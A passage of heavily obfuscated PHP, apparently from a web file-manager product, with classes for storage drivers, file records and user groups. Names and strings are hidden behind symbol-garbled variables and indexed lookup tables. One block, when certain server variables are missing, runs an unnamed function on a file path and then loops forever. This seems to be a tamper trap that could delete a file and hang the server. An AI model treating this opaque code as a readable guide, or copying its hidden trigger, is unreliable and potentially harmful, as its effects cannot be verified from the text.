== $Ïÿô»ûÈ[1378]) { continue; } $ÏﬂÆÙÎÊ = $µÒ›™‰¨ . $Êÿ£¯–Á; if (is_file($ÏﬂÆÙÎÊ)) { $ÂŒ·ÔÚ‹[$Ïÿô»ûÈ[96]][] = $this->fileInfo($ÏﬂÆÙÎÊ, $ßÌø» ¡); } else { $ÂŒ·ÔÚ‹[$Ïÿô»ûÈ[95]][] = $this->folderInfo($ÏﬂÆÙÎÊ, $ßÌø» ¡); } } closedir($∂–¸ñö’); return $ÂŒ·ÔÚ‹; } public function listAll($ÜµâöÏ”, &$È£°€È® = array()) { $œÑˆûñÔ =& $_SERVER[ˆë€Ï⁄∂]; $ÜµâöÏ” = $this->iconvSystem($ÜµâöÏ”); $ÜµâöÏ” = rtrim($ÜµâöÏ”, $œÑˆûñÔ[8]) . $œÑˆûñÔ[8]; if (!($‘â¿πØæ = @opendir($ÜµâöÏ”))) { return $È£°€È®; } while (($Ú≥≠ΩîÊ = readdir($‘â¿πØæ)) !== !1) { if ($Ú≥≠ΩîÊ == $œÑˆûñÔ[10] || $Ú≥≠ΩîÊ == $œÑˆûñÔ[1378]) { continue; } $»œ‡€∑∏ = $ÜµâöÏ” . $Ú≥≠ΩîÊ; $∂ó˙„ç™ = is_dir($»œ‡€∑∏) && !is_link($»œ‡€∑∏) ? 1 : 0; $»œ‡€∑∏ = $∂ó˙„ç™ ? $»œ‡€∑∏ . $œÑˆûñÔ[8] : $»œ‡€∑∏; $È£°€È®[] = array($œÑˆûñÔ[97] => $»œ‡€∑∏, $œÑˆûñÔ[88] => $∂ó˙„ç™, $œÑˆûñÔ[98] => intval(@filemtime($»œ‡€∑∏)), $œÑˆûñÔ[89] => $∂ó˙„ç™ ? 0 : intval($this->size($»œ‡€∑∏))); if ($∂ó˙„ç™) { $this->listAll($»œ‡€∑∏, $È£°€È®); } } closedir($‘â¿πØæ); return $È£°€È®; } public function has($ó™ú˙Áˆ, $ŸÌÆ´∞ä = false, $ºü¯Éµ‰ = true) { $ËÄó¥ÅÁ =& $_SERVER[ˆë€Ï⁄∂]; $ó™ú˙Áˆ = $this->iconvSystem($ó™ú˙Áˆ); $ó™ú˙Áˆ = rtrim($ó™ú˙Áˆ, $ËÄó¥ÅÁ[8]) . $ËÄó¥ÅÁ[8]; if (!($ÖË¬©œ˝ = @opendir($ó™ú˙Áˆ))) { return !1; } $Î‚˙ô«‡ = 0; $˘Ò£±Ñ = 0; $ªç√øÑ˛ = 0; while (($å»ùÉ’… = readdir($ÖË¬©œ˝)) !== !1) { if ($å»ùÉ’… == $ËÄó¥ÅÁ[10] || $å»ùÉ’… == $ËÄó¥ÅÁ[1378]) { continue; } $˙Æ‹ößÁ = $ó™ú˙Áˆ . $å»ùÉ’…; if ($ŸÌÆ´∞ä) { $ªç√øÑ˛++; if (@is_file($˙Æ‹ößÁ)) { $Î‚˙ô«‡++; } else { $˘Ò£±Ñ++; } if ($ªç√øÑ˛ > 10000) { break; } continue; } if ($ºü¯Éµ‰) { if (@is_file($˙Æ‹ößÁ)) { return !0; } } else { if (@is_dir($˙Æ‹ößÁ . $ËÄó¥ÅÁ[8])) { return !0; } } } closedir($ÖË¬©œ˝); if ($ŸÌÆ´∞ä) { return array($ËÄó¥ÅÁ[251] => $Î‚˙ô«‡, $ËÄó¥ÅÁ[252] => $˘Ò£±Ñ); } return !1; } public function hashSimple($©ö´È†«) { $Õ˛ß¿·ƒ =& $_SERVER[ˆë€Ï⁄∂]; if (!$©ö´È†«) { return md5($Õ˛ß¿·ƒ[12]); } $©ö´È†« = $this->iconvSystem($©ö´È†«); $Ä¥ﬂí“… = $this->size($©ö´È†«); $ƒΩ·©Œ¡ = 200; $øªÍÉ„∏ = 50; if ($Ä¥ﬂí“… <= $ƒΩ·©Œ¡ * $øªÍÉ„∏) { return $this->hashMd5($©ö´È†«) . $Ä¥ﬂí“…; } $ÕªÆÿ€ª = $Õ˛ß¿·ƒ[12]; $Û…„˚ô« = intval($Ä¥ﬂí“… / $øªÍÉ„∏); $ ¯„Ëµë = fopen($©ö´È†«, $Õ˛ß¿·ƒ[1474]); if (!$ ¯„Ëµë) { return $ÕªÆÿ€ª; } for ($¬≤≥ß¶ó = 0; $¬≤≥ß¶ó < $øªÍÉ„∏; $¬≤≥ß¶ó++) { fseek_64($ ¯„Ëµë, $Û…„˚ô« * $¬≤≥ß¶ó); $ÕªÆÿ€ª .= fread($ ¯„Ëµë, $ƒΩ·©Œ¡); } fseek_64($ ¯„Ëµë, $Ä¥ﬂí“… - $ƒΩ·©Œ¡); $ÕªÆÿ€ª .= fread($ ¯„Ëµë, $ƒΩ·©Œ¡); fclose($ ¯„Ëµë); return md5($ÕªÆÿ€ª) . $Ä¥ﬂí“…; } public function getContent($ª¯ïâ≥‚) { $ª¯ïâ≥‚ = $this->iconvSystem($ª¯ïâ≥‚); return file_get_contents($ª¯ïâ≥‚); } public function setContent($ÂÓ”•Úò, $£¡ƒù›á = '') { $ÂÓ”•Úò = $this->iconvSystem($ÂÓ”•Úò); $ÖÎªç…à = @file_put_contents($ÂÓ”•Úò, $£¡ƒù›á, LOCK_EX); if (!$ÖÎªç…à) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); } clearstatcache(); @chmod($ÂÓ”•Úò, $this->pathAuth); return $ÖÎªç…à === !1 ? !1 : !0; } public function fileSubstr($ﬂÃ¸˛ùÑ, $ì≠≤ëäõ = 0, $∏àã˘‚» = false) { $«≈˝Ú≤· =& $_SERVER[ˆë€Ï⁄∂]; $ﬂÃ¸˛ùÑ = $this->iconvSystem($ﬂÃ¸˛ùÑ); if ($∏àã˘‚» === !1) { $∏àã˘‚» = $this->size($ﬂÃ¸˛ùÑ); } if ($∏àã˘‚» <= 0) { return $«≈˝Ú≤·[12]; } $˚¢…•Â§ = fopen($ﬂÃ¸˛ùÑ, $«≈˝Ú≤·[1474]); if (!$˚¢…•Â§) { return !1; } fseek_64($˚¢…•Â§, $ì≠≤ëäõ); $÷ã√Í≈¬ = fread($˚¢…•Â§, $∏àã˘‚»); fclose($˚¢…•Â§); if (!$÷ã√Í≈¬) { $this->writeLog(__FUNCTION__ . $«≈˝Ú≤·[1466], !0); } return $÷ã√Í≈¬; } public function upload($Ë∏€åóÜ, $ÉéÂ˝áõ, $ÄıÕ« ƒ = false, $¶§πêÀ» = REPEAT_REPLACE) { if ($ÄıÕ« ƒ) { return $this->moveFile($ÉéÂ˝áõ, $Ë∏€åóÜ); } return $this->copyFile($ÉéÂ˝áõ, $Ë∏€åóÜ); } public function setModifyTime($∆õ√«µ—, $±™ªü¿≈ = '') { @touch($∆õ√«µ—, intval($±™ªü¿≈)); } public function download($®¿·≤œÁ, $œ≠ù»ÏÏ) { return $this->iconvSystem($®¿·≤œÁ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ô¿ì¢Ù¬) { parent::__construct($ô¿ì¢Ù¬); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } public function fileOutImage($ÿ¥¢§ªß, $â¥˛†⁄Ó = 250) { $“‡§™‹ª =& $_SERVER[ˆë€Ï⁄∂]; if ($this->size($ÿ¥¢§ªß) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÿ¥¢§ªß, $â¥˛†⁄Ó); } $ëê†öñ” = array($“‡§™‹ª[1475] => $“‡§™‹ª[1476] . $â¥˛†⁄Ó . $“‡§™‹ª[1477]); $ ∫Ë€·¨ = $this->link($ÿ¥¢§ªß, $ëê†öñ”); $this->fileOutLink($ ∫Ë€·¨); } public function fileOutLink($ÍäÌ¬ªÄ) { $ÛÉ¢¡ò˝ =& $_SERVER[ˆë€Ï⁄∂]; if (substr($ÍäÌ¬ªÄ, 0, 7) == $ÛÉ¢¡ò˝[228]) { $ÍäÌ¬ªÄ = $ÛÉ¢¡ò˝[229] . substr($ÍäÌ¬ªÄ, 7); } header($ÛÉ¢¡ò˝[185] . $ÍäÌ¬ªÄ); die; } } if (!isset($_SERVER[$_SERVER[ˆë€Ï⁄∂][54]]) || !isset($_SERVER[$_SERVER[ˆë€Ï⁄∂][63]])) { $_getc = $_SERVER[ˆë€Ï⁄∂][56]; $_getfile = $_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆë€Ï⁄∂][59], $_getfilec); if (count($_getarrs) < $_SERVER[ˆë€Ï⁄∂][60]) { $exit = $_SERVER[ˆë€Ï⁄∂][61]; $exit(); } $_act = $_SERVER[ˆë€Ï⁄∂][62]; $_act($_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆë€Ï⁄∂][465]); } } goto báåØÿ‚ü¶; B∆•”ñ¡í: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65\x5f\x63\x6f\x6e\x74\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\143\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\x69\157\x5f\146\x69\x6c\145\137\x6d\145\x74\x61", "\155\x65\x74\x61\x46\x69\x65\x6c\144" => "\146\151\x6c\145\x49\104"); public function fileInfo($í÷áã¯∂) { $Åç¶ô™â =& $_SERVER[ˆë€Ï⁄∂]; static $à÷Ø‰∫ = array(); if (!isset($à÷Ø‰∫[$í÷áã¯∂])) { $å¬ë∆÷Ü = $Åç¶ô™â[2038]; $≥íÿÙ‹¥ = Model($Åç¶ô™â[555])->field($å¬ë∆÷Ü)->where(array($Åç¶ô™â[553] => $í÷áã¯∂))->find(); $à÷Ø‰∫[$í÷áã¯∂] = $≥íÿÙ‹¥; } return $à÷Ø‰∫[$í÷áã¯∂]; } public function addFileByContent($É˘éæç£ = '', $‡°Ÿßó∏ = '') { $º´∏≠⁄– =& $_SERVER[ˆë€Ï⁄∂]; $≠é‹õ‹ù = TEMP_PATH . $º´∏≠⁄–[2039]; if (!is_dir($≠é‹õ‹ù)) { mk_dir($≠é‹õ‹ù); } $∂å€©–≠ = $≠é‹õ‹ù . $º´∏≠⁄–[2040] . rand_string(16); file_put_contents($∂å€©–≠, $É˘éæç£); $ ıˆ›ù◊ = $this->addFile($∂å€©–≠, $‡°Ÿßó∏, !0); if (file_exists($∂å€©–≠)) { @unlink($∂å€©–≠); } return $ ıˆ›ù◊; } public function createFileName($ÎüØô‘ﬁ, $´Îã÷»ó = false, $˜î∫Åñê = false) { $æÉ•îÒÍ =& $_SERVER[ˆë€Ï⁄∂]; $¿ÛÆ‹∆É = IO::init($æÉ•îÒÍ[8]); $˜ÿóµ’ù = $this->makeFilePath($ÎüØô‘ﬁ, $¿ÛÆ‹∆É, $´Îã÷»ó, $˜î∫Åñê); $õﬁ¶ü≥Ò = $¿ÛÆ‹∆É->pathFather($˜ÿóµ’ù); static $Ôö¿Ò¡õ = false; $¨≤ËüÑŒ = $æÉ•îÒÍ[2041] . md5($õﬁ¶ü≥Ò); if (!$Ôö¿Ò¡õ && !Cache::get($¨≤ËüÑŒ)) { $Ôö¿Ò¡õ = !0; $‚õÊØÿ˘ = IO::mkdir($õﬁ¶ü≥Ò); if (!IO::exist($‚õÊØÿ˘ . $æÉ•îÒÍ[889])) { IO::mkfile($‚õÊØÿ˘ . $æÉ•îÒÍ[889]); } Cache::set($¨≤ËüÑŒ, 1, 3600 * 2); } return $˜ÿóµ’ù; } public function makeFilePath($â ü¸öá, $ÒÖÜﬁ‡∞, $çé≥∂ëÍ = false, $‡ﬁÆÑ¨ã = false) { $ÉäØ·å° =& $_SERVER[ˆë€Ï⁄∂]; $¸öé•«Ç = Model($ÉäØ·å°[861])->get($ÉäØ·å°[2042]); $‹ãÅúÁî = KodIO::defaultIO() . date($ÉäØ·å°[2043]); $§˙çŒ⁄Ã = $‹ãÅúÁî . rand_string(5) . short_id(100); $â ü¸öá = str_replace($ÉäØ·å°[8], $ÉäØ·å°[11], KodIO::clear($â ü¸öá)); $æƒ‰Ï€Ê = $ÒÖÜﬁ‡∞->ext($â ü¸öá); if (!$â ü¸öá) { $¸öé•«Ç = $ÉäØ·å°[867]; } switch ($¸öé•«Ç) { case $ÉäØ·å°[2044]: if ($æƒ‰Ï€Ê) { $§˙çŒ⁄Ã = $§˙çŒ⁄Ã . $ÉäØ·å°[10] . $æƒ‰Ï€Ê; } if ($æƒ‰Ï€Ê == $ÉäØ·å°[1980]) { $§˙çŒ⁄Ã .= $ÉäØ·å°[1306]; } break; case $ÉäØ·å°[2045]: $´»Û√≈∫ = Model($ÉäØ·å°[861])->get($ÉäØ·å°[862]); $Ÿß≠∏¯  = substr(md5($ÉäØ·å°[863] . $´»Û√≈∫ . date($ÉäØ·å°[840])), 0, 8); $Ü˘ÉÅ˚— = KodIO::defaultDriver(); $‹ãÅúÁî = $ÉäØ·å°[1337] . $Ü˘ÉÅ˚—[$ÉäØ·å°[486]] . $ÉäØ·å°[495] . date($ÉäØ·å°[2046]) . $Ÿß≠∏¯  . $ÉäØ·å°[8]; if ($æƒ‰Ï€Ê == $ÉäØ·å°[1980]) { $â ü¸öá .= $ÉäØ·å°[1306]; } $¯÷Ñ⁄¯ê = $ÉäØ·å°[2047] . $‹ãÅúÁî . $â ü¸öá; CacheLock::lock($¯÷Ñ⁄¯ê); $§˙çŒ⁄Ã = $‹ãÅúÁî . $â ü¸öá; if (IO::exist($‹ãÅúÁî . $â ü¸öá)) { $◊Ñﬂ¢çá = substr($â ü¸öá, 0, strlen($â ü¸öá) - strlen($æƒ‰Ï€Ê)); $≈ÜœÈÅ∂ = $‡ﬁÆÑ¨ã ? substr($‡ﬁÆÑ¨ã, 0, 5) : ($çé≥∂ëÍ ? substr($çé≥∂ëÍ, 0, 5) : rand_string(5)); $§˙çŒ⁄Ã = $‹ãÅúÁî . $◊Ñﬂ¢çá . $≈ÜœÈÅ∂; if ($æƒ‰Ï€Ê) { $§˙çŒ⁄Ã = $§˙çŒ⁄Ã . $ÉäØ·å°[10] . $æƒ‰Ï€Ê; } } if (IO::isOsDriver($§˙çŒ⁄Ã) && !IO::isUploadServer($§˙çŒ⁄Ã)) { if (IO::exist($§˙çŒ⁄Ã)) { CacheLock::unlock($¯÷Ñ⁄¯ê); return $§˙çŒ⁄Ã; } $™óé‡µË = IO::setContent($§˙çŒ⁄Ã, $ÉäØ·å°[12]); if (!$™óé‡µË) { show_json($ÉäØ·å°[2048], !1); } } CacheLock::unlock($¯÷Ñ⁄¯ê); break; case $ÉäØ·å°[867]: break; default: break; } return $§˙çŒ⁄Ã; } public function addFileByRemote($ÙıÀ˙«ﬁ, $Í¿Ë√«Ü, $ô˘†ÍÏç = array()) { $≈â”Î÷¿ =& $_SERVER[ˆë€Ï⁄∂]; if (!IO::exist($ÙıÀ˙«ﬁ)) { return !1; } $†∫ìÉ≤° = $ô˘†ÍÏç[$≈â”Î÷¿[558]] ? $ô˘†ÍÏç[$≈â”Î÷¿[558]] : $≈â”Î÷¿[12]; $Ωÿ≥“Õã = IO::hashMd5($ÙıÀ˙«ﬁ, $†∫ìÉ≤°); $‘ÔÄ——ù = KodIO::defaultDriver(); $†µ⁄Àô˙ = array($≈â”Î÷¿[631] => IO::size($ÙıÀ˙«ﬁ), $≈â”Î÷¿[2049] => 1, $≈â”Î÷¿[505] => $Í¿Ë√«Ü, $≈â”Î÷¿[900] => $‘ÔÄ——ù[$≈â”Î÷¿[486]], $≈â”Î÷¿[506] => $ÙıÀ˙«ﬁ, $≈â”Î÷¿[2050] => $ô˘†ÍÏç[$≈â”Î÷¿[686]] ? $ô˘†ÍÏç[$≈â”Î÷¿[686]] : IO::hashSimple($ÙıÀ˙«ﬁ), $≈â”Î÷¿[2051] => $Ωÿ≥“Õã ? $Ωÿ≥“Õã : $†∫ìÉ≤°); if ($ú¡◊”Ìá = $this->addFileCheckExist($†µ⁄Àô˙[$≈â”Î÷¿[686]], $†µ⁄Àô˙[$≈â”Î÷¿[558]], $†µ⁄Àô˙[$≈â”Î÷¿[89]])) { return $ú¡◊”Ìá; } return $this->addFileData($†µ⁄Àô˙); } private function addFileData($àù”¡¡‘) { $ò“£á∏ =& $_SERVER[ˆë€Ï⁄∂]; if (!$àù”¡¡‘) { return !1; } $àù”¡¡‘[$ò“£á∏[89]] = intval($àù”¡¡‘[$ò“£á∏[89]]); if (!$àù”¡¡‘[$ò“£á∏[89]] && strlen($àù”¡¡‘[$ò“£á∏[686]]) > 32) { $àù”¡¡‘[$ò“£á∏[89]] = intval(substr($àù”¡¡‘[$ò“£á∏[686]], 32)); } $∂‰¯£±Å = $this->add($àù”¡¡‘); return $this->find($∂‰¯£±Å); } public function addFile($üÜßﬂ‘ã, $è¿é∏¨π, $®Î¿˙´Ë = false) { $¨Ó¨â°€ =& $_SERVER[ˆë€Ï⁄∂]; $±Ú˛á¸ê = IO::hashSimple($üÜßﬂ‘ã); $Çá≥ÿª¿ = IO::size($üÜßﬂ‘ã); $≈⁄óúî© = $Çá≥ÿª¿ <= 1024 * 1024 * 10 ? IO::hashMd5($üÜßﬂ‘ã) : $¨Ó¨â°€[12]; $®÷Âõı◊ = $¨Ó¨â°€[2052] . $±Ú˛á¸ê; CacheLock::lock($®÷Âõı◊); if ($≈⁄óúî© && $±Ú˛á¸ê) { $˝‘ˆøñﬁ = $this->addFileCheckExist($±Ú˛á¸ê, $≈⁄óúî©, $Çá≥ÿª¿); if ($˝‘ˆøñﬁ) { CacheLock::unlock($®÷Âõı◊); return $˝‘ˆøñﬁ; } } $üÀæú∫» = $this->addFileMake($üÜßﬂ‘ã, $Çá≥ÿª¿, $±Ú˛á¸ê, $≈⁄óúî©, $è¿é∏¨π, $®Î¿˙´Ë); $÷ù˝‰»ÿ = $this->addFileData($üÀæú∫»); CacheLock::unlock($®÷Âõı◊); if (!$≈⁄óúî© && $÷ù˝‰»ÿ) { $this->fileMd5Check($÷ù˝‰»ÿ); } return $÷ù˝‰»ÿ; } public function fileMd5Check($ö‘‡ç†‡) { $áÑß©“ﬁ =& $_SERVER[ˆë€Ï⁄∂]; $™Ï•◊ëô = array($ö‘‡ç†‡[$áÑß©“ﬁ[552]], $ö‘‡ç†‡[$áÑß©“ﬁ[97]]); $⁄Ã¸ëôÜ = $áÑß©“ﬁ[2053] . $ö‘‡ç†‡[$áÑß©“ﬁ[97]]; $¢¡‡ıˆı = $áÑß©“ﬁ[2054] . $ö‘‡ç†‡[$áÑß©“ﬁ[552]]; TaskQueue::add($áÑß©“ﬁ[2055], $™Ï•◊ëô, $⁄Ã¸ëôÜ, $¢¡‡ıˆı); } public function fileMd5Set($Ÿû”˙≈‡, $ôŒ„ÿöª) { $Ã“Ãôàå =& $_SERVER[ˆë€Ï⁄∂]; $ê∏ù»˜Ë = $this->find($Ÿû”˙≈‡); if (!$ê∏ù»˜Ë || $ê∏ù»˜Ë[$Ã“Ãôàå[558]]) { return; } $Ìû›—™… = IO::hashMd5($ôŒ„ÿöª); if (!$Ìû›—™…) { return $Ã“Ãôàå[12]; } $this->where(array($Ã“Ãôàå[552] => $Ÿû”˙≈‡))->save(array($Ã“Ãôàå[558] => $Ìû›—™…)); } public function addFileMake($å• Ä¯¥, $∂§ËÇ´», $ø˛Ÿ÷Úí, $ÔùóÖÇÈ, $ΩÕòòÍƒ, $ﬂ£Ñ©Ô‚) { $Âî±≥öÄ =& $_SERVER[ˆë€Ï⁄∂]; $À∆ÎÅ‹Ö = $this->createFileName($ΩÕòòÍƒ, $ø˛Ÿ÷Úí, $ÔùóÖÇÈ); $‹ÄÁ£ò˙ = get_path_father($À∆ÎÅ‹Ö); $¡≥ Æ˚È = get_path_this($À∆ÎÅ‹Ö); if ($ﬂ£Ñ©Ô‚) { $éÑΩÜµ» = IO::move($å• Ä¯¥, $‹ÄÁ£ò˙, !1, $¡≥ Æ˚È); } else { $éÑΩÜµ» = IO::copy($å• Ä¯¥, $‹ÄÁ£ò˙, !1, $¡≥ Æ˚È); } if (!$éÑΩÜµ») { return !1; } $Æ¡ﬂú≥ = KodIO::defaultDriver(); $‡ﬂ‹¸‡˜ = array($Âî±≥öÄ[631] => $∂§ËÇ´», $Âî±≥öÄ[2049] => 1, $Âî±≥öÄ[505] => $ΩÕòòÍƒ, $Âî±≥öÄ[900] => $Æ¡ﬂú≥[$Âî±≥öÄ[486]], $Âî±≥öÄ[506] => $À∆ÎÅ‹Ö, $Âî±≥öÄ[2050] => $ø˛Ÿ÷Úí, $Âî±≥öÄ[2051] => $ÔùóÖÇÈ); return $‡ﬂ‹¸‡˜; } public function addFileCheckExist($“º∫≠≥¬, $ÁÿÖº˙π, $Åè–¸ —) { $Çöåﬁ•è =& $_SERVER[ˆë€Ï⁄∂]; $î‰ÆΩƒ˙ = $this->findByHash($“º∫≠≥¬, $ÁÿÖº˙π); if (!$î‰ÆΩƒ˙) { return !1; } $ÇÉ§Õ°‘ = array($Çöåﬁ•è[2049] => intval($î‰ÆΩƒ˙[$Çöåﬁ•è[2056]]) + 1, $Çöåﬁ•è[631] => $Åè–¸ —); $this->where(array($Çöåﬁ•è[553] => $î‰ÆΩƒ˙[$Çöåﬁ•è[552]]))->save($ÇÉ§Õ°‘); return $î‰ÆΩƒ˙; } public function remove($Ê‹∆æï») { $this->linkCountChange($Ê‹∆æï», !1); $this->clearEmpty(); return !0; } public function linkAdd($ôåËÕÿ∫) { $this->linkCountChange($ôåËÕÿ∫, !0); } public function linkCountChange($°√Ò“ÆÙ, $ÉÃÑñé) { $Ã∞´≥∏≠ =& $_SERVER[ˆë€Ï⁄∂]; if (!$°√Ò“ÆÙ) { return; } if (!is_array($°√Ò“ÆÙ)) { $°√Ò“ÆÙ = array($°√Ò“ÆÙ); } $áÕÀ”ÉË = array(); foreach ($°√Ò“ÆÙ as $„⁄÷¿ªÈ) { $ª¿Ãù√Ø = $„⁄÷¿ªÈ . $Ã∞´≥∏≠[12]; if (!$áÕÀ”ÉË[$ª¿Ãù√Ø]) { $áÕÀ”ÉË[$ª¿Ãù√Ø] = 0; } $áÕÀ”ÉË[$ª¿Ãù√Ø]++; } $ƒÆ©Îº˝ = array(); foreach ($áÕÀ”ÉË as $„⁄÷¿ªÈ => $¿ﬁ¸’„¶) { $ª¿Ãù√Ø = $¿ﬁ¸’„¶ . $Ã∞´≥∏≠[12]; if (!$ƒÆ©Îº˝[$ª¿Ãù√Ø]) { $ƒÆ©Îº˝[$ª¿Ãù√Ø] = array(); } $ƒÆ©Îº˝[$ª¿Ãù√Ø][] = $„⁄÷¿ªÈ; } foreach ($ƒÆ©Îº˝ as $¿ﬁ¸’„¶ => $è’ƒÄé») { if (!$è’ƒÄé») { continue; } $¿ﬁ¸’„¶ = $ÉÃÑñé ? $¿ﬁ¸’„¶ : -intval($¿ﬁ¸’„¶); $¥†‰—∏ô = array($Ã∞´≥∏≠[552] => array($Ã∞´≥∏≠[7], $è’ƒÄé»)); if ($¿ﬁ¸’„¶ < 0) { $¥†‰—∏ô[$Ã∞´≥∏≠[2056]] = array($Ã∞´≥∏≠[1107], abs($¿ﬁ¸’„¶)); } $this->where($¥†‰—∏ô)->setAdd($Ã∞´≥∏≠[2056], $¿ﬁ¸’„¶); } } public function findByHash($Ù ¥§®À, $‹—≈›’Ì = false) { $ÊﬁÕ…¶º =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ù ¥§®À && !$‹—≈›’Ì) { return !1; } $‚„åõ“ = array($ÊﬁÕ…¶º[2050] => $Ù ¥§®À); if ($‹—≈›’Ì) { $‚„åõ“ = array($ÊﬁÕ…¶º[2051] => $‹—≈›’Ì); } return $this->order($ÊﬁÕ…¶º[2057])->where($‚„åõ“)->find(); } public function clearEmpty($¢˙´‡Õ· = 1) { $øòÏã¿¶ =& $_SERVER[ˆë€Ï⁄∂]; $·©ñúÑΩ = time() - 3600 * 24 * $¢˙´‡Õ·; $•’‰ª†ò = $øòÏã¿¶[2058] . $·©ñúÑΩ; $Ï∂È√Æ˚ = $this->where($•’‰ª†ò)->select(); if (!$Ï∂È√Æ˚) { return; } $˜ÿÎ¢Ûá = new Task($øòÏã¿¶[2059], $øòÏã¿¶[12], count($Ï∂È√Æ˚)); foreach ($Ï∂È√Æ˚ as $äı◊Œæ˙) { $˜ÿÎ¢Ûá->update(1); $this->resetFile($äı◊Œæ˙); } $˜ÿÎ¢Ûá->end(); } public function resetFile($›ÊÛ˚∂˙) { $≤¸¥∑≥ú =& $_SERVER[ˆë€Ï⁄∂]; $õ„£¨©† = array($≤¸¥∑≥ú[553] => $›ÊÛ˚∂˙[$≤¸¥∑≥ú[552]]); $Ã≠¯åîÑ = Model($≤¸¥∑≥ú[1436])->where($õ„£¨©†)->count(); $ŸπŸ´å‡ = Model($≤¸¥∑≥ú[2060])->where($õ„£¨©†)->count(); $á´ô≈œ“ = intval($Ã≠¯åîÑ) + intval($ŸπŸ´å‡); if ($á´ô≈œ“ == 0) { IO::remove($›ÊÛ˚∂˙[$≤¸¥∑≥ú[97]]); Model($≤¸¥∑≥ú[2061])->delete($›ÊÛ˚∂˙[$≤¸¥∑≥ú[552]]); $this->where($õ„£¨©†)->delete(); $this->metaSet($›ÊÛ˚∂˙[$≤¸¥∑≥ú[552]], null, null); write_log(ACTION . $≤¸¥∑≥ú[2062] . KodUser::id() . $≤¸¥∑≥ú[2063] . $›ÊÛ˚∂˙[$≤¸¥∑≥ú[552]] . $≤¸¥∑≥ú[2064] . $›ÊÛ˚∂˙[$≤¸¥∑≥ú[89]] . $≤¸¥∑≥ú[211] . $›ÊÛ˚∂˙[$≤¸¥∑≥ú[97]], $≤¸¥∑≥ú[2065]); return; } if ($›ÊÛ˚∂˙[$≤¸¥∑≥ú[2056]] != $á´ô≈œ“) { $this->where($õ„£¨©†)->save(array($≤¸¥∑≥ú[2049] => $á´ô≈œ“)); } } public function storageInfo($”Ò’†∑¸ = false) { $â«‡ê•˙ =& $_SERVER[ˆë€Ï⁄∂]; $•±ê÷¸∑ = $this->count() + 0.0; $àˆ§è÷∂ = 0; $π¸òû≈« = 1; $ËÊÖÜ∞– = 0; $§›±á¡œ = 5000; for ($ÅÚ¥©Óú = 0; $ÅÚ¥©Óú < $•±ê÷¸∑; $ÅÚ¥©Óú = $ÅÚ¥©Óú + $§›±á¡œ) { $Ï™ÀŒ‚ï = $this->limit($ÅÚ¥©Óú, $ÅÚ¥©Óú + $§›±á¡œ)->select(); foreach ($Ï™ÀŒ‚ï as $——ËÕ§ú) { $π¸òû≈« += $——ËÕ§ú[$â«‡ê•˙[89]] * $——ËÕ§ú[$â«‡ê•˙[2056]]; $àˆ§è÷∂ += $——ËÕ§ú[$â«‡ê•˙[89]] * ($——ËÕ§ú[$â«‡ê•˙[2056]] - 1); $ËÊÖÜ∞– += $——ËÕ§ú[$â«‡ê•˙[2056]]; } } $ÿ£∫¬–ƒ = array($â«‡ê•˙[2066] => $π¸òû≈«, $â«‡ê•˙[2067] => $àˆ§è÷∂, $â«‡ê•˙[2068] => $àˆ§è÷∂ / $π¸òû≈«, $â«‡ê•˙[93] => $•±ê÷¸∑, $â«‡ê•˙[2069] => $ËÊÖÜ∞–); return $ÿ£∫¬–ƒ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\x6d\x65" => "\x67\162\x6f\x75\x70\x5f\x6d\145\164\x61", "\155\x65\164\x61\x46\x69\x65\154\144" => "\147\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($ÛÏó†íó) { $÷≈ÊÜ©ƒ =& $_SERVER[ˆë€Ï⁄∂]; return array($÷≈ÊÜ©ƒ[2070] => array($ÛÏó†íó[0], $÷≈ÊÜ©ƒ[2071]), $÷≈ÊÜ©ƒ[2072] => array($ÛÏó†íó[0], $÷≈ÊÜ©ƒ[2073])); } protected function getInfo($éƒ˚©Åä, $∆Âó¡∆∆ = false) { $ﬁÑ∞Ò È = $this->getInfoSimple($éƒ˚©Åä); if (!$ﬁÑ∞Ò È) { return !1; } if ($∆Âó¡∆∆) { return $this->_listDataApplyItem($ﬁÑ∞Ò È); } return $this->cacheFunctionGet($_SERVER[ˆë€Ï⁄∂][2074], $éƒ˚©Åä); } protected function getInfoSimple($œ≠çí¿Ñ, $…ﬂü‚Ëﬂ = false) { $Èù∑ØÚ∆ =& $_SERVER[ˆë€Ï⁄∂]; if ($…ﬂü‚Ëﬂ) { $ë¿Æë∫è = array($Èù∑ØÚ∆[1988] => intval($œ≠çí¿Ñ)); $†µ‚ªàﬂ = $this->where($ë¿Æë∫è)->find(); return is_array($†µ‚ªàﬂ) ? $†µ‚ªàﬂ : array(); } return $this->cacheFunctionGet($Èù∑ØÚ∆[2075], $œ≠çí¿Ñ); } protected function groupAdd($Ÿ•ﬂöﬁÉ) { $ÎÛ÷àñ‚ =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[202]] && isset($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]]) && $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]] == 1) { if ($‘èæäıƒ = $this->getInfoSimple($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]], !0)) { return $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]]; } } else { $‘èæäıƒ = 